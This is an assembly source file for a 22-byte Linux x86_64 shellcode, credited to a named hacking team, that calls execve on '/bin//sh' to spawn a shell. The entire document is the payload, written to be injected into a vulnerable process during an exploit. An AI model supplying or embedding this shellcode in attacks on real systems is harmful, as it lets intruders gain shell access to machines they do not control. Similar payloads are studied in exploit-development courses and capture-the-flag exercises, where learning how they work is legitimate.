BITS 64
; Author Rinzler - l33t1m Team
; /bin/sh Linux x86_64 Shellcode
; Shellcode size 22 bytes
global _start

_start:
	push 59
	pop rax
	cdq
	
	push rdx
	mov rdi, 0x68732f2f6e69622f
	push rdi
	push rsp
	pop rdi
	xor esi, esi
	syscall